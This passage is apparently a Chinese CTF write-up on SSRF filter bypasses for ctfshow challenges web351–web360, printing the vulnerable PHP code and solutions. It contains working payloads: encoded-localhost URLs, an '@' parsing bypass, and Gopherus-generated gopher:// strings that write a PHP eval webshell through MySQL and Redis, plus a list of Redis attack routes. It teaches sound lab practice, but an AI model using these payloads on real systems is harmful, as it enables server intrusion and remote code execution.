title="五、SSRF漏洞常见绕过方式："></a>五、SSRF漏洞常见绕过方式：</h3><h4 id="5-1-采用短网址绕过-amp-采用进制转换"><a href="#5-1-采用短网址绕过-amp-采用进制转换" class="headerlink" title="5.1 采用短网址绕过 &amp; 采用进制转换"></a>5.1 采用短网址绕过 &amp; 采用进制转换</h4><blockquote><p style="color:blue;">采用短网址进行绕过和进制转化绕过都是非常经典的方式，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote><h5 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//初始化一个cURL会话</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设定返回信息中包含响应信息头</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//启用时会将头文件的信息作为数据流输出。 </span><span class="token comment">//参数为1表示输出信息头,为0表示不输出</span><span class="token comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//参数为1表示$result,为0表示echo $result</span><span class="token comment">//执行一个cURL会话</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭一个curl会话</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个flag.php，直接访问给了提示，非本地用户无法访问， 要让我们以本地用户去访问127.0.0.1/flag.php </p><blockquote><p style="color:blue;">url=http://127.0.0.1/flag.php</p></blockquote><h5 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 进行了过滤，过滤掉了localhost和127.0.0.*</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//启用时会将头文件的信息作为数据流输出</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">url=http://0x7F.0.0.1/flag.php   16进制</p><p style="color:blue;">url=http://0177.0.0.1/flag.php    8进制</p><p style="color:blue;">url=http://0.0.0.0/flag.php</p><p style="color:blue;">url=http://0/flag.php</p><p style="color:blue;">url=http://127.127.127.127/flag.php</p></blockquote><h5 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里过滤了。数字127等，我们不能利用句号或者短网址进行绕过</span>            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>十六进制 url=<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>八进制 url=<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>10 进制整数格式 url=<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>16 进制整数格式 url=<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a><br>短网址方式：127.0.0.1也可以写成127.1<br>用CIDR绕过localhost<br>url=<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a><br>url=<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url=<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p></blockquote><h5 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-2-限制为http-www-xxx-com-域名时（利用-）"><a href="#5-2-限制为http-www-xxx-com-域名时（利用-）" class="headerlink" title="5.2 限制为http://www.xxx.com 域名时（利用@）"></a>5.2 限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</h4><p>可以尝试采用http基本身份认证的方式绕过如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异./">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异。</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p><h5 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code> ，我们可以用@方式进行绕过，如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p><h4 id="5-3-SSRF利用-Gopher-协议拓展攻击面"><a href="#5-3-SSRF利用-Gopher-协议拓展攻击面" class="headerlink" title="5.3 SSRF利用 Gopher 协议拓展攻击面"></a>5.3 SSRF利用 Gopher 协议拓展攻击面</h4><h5 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Web359登录界面.png" alt="1666666568052" style="zoom:25%;" /><p>随便输一个用户名，进入后台<del>靶场并没有做</del>，使用hackbar工具打开，我们可以看到在登录时前后端传参的方法</p><pre class="line-numbers language-none"><code class="language-none">returl&#x3D;https%3A%2F%2F404.chall.ctf.show%2F&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SSRF漏洞出现在returl参数上， 利用gopher协议去打无密码的mysql 。</p><p>这里要用到工具Gopherus来生成payload进行rce ，我们可以做一个一句话木马写进去</p><blockquote><p>工具下载地址: <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> </p></blockquote><blockquote><p>select ‘<?php eval($_POST[1]); ?>‘ into outfile ‘/var/www/html/1.php</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面.png" style="zoom: 67%;" /><blockquote><p>这里得到的参数必须在进行一次URL编码才能进行利用。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">returl&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%2520%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2501%2500%2500%2500%2501&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个是check.php 不过没找到什么可以用的东西….</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|dict/i"</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">_request</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">_request</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span><span class="token variable">$https</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置不需要头信息</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取页面内容，但不输出</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$https</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做服务器认</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做客户端认证</span>        <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token operator">==</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置请求是post方式</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置post请求数据</span>        <span class="token punctuation">&#125;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行访问</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭curl，释放资源</span><span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ctfshow{2abfc1df-79f7-49a9-b02a-d5d5908d150e}</p></blockquote><h5 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ssrf打redis，基本上四种攻击方式：</p><ul><li>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li><li>主从复制</li></ul><p>当然这个题目肯定是shell，这次的flag并不在本地的flag文件中。题目提示我们打redis，同样用Gopherus工具来生成我们的payload。同样写一句话木马进去。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面2.png" style="zoom: 80%;" /><blockquote><p>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</p></blockquote><h4 id="5-4-其他绕过方式："><a 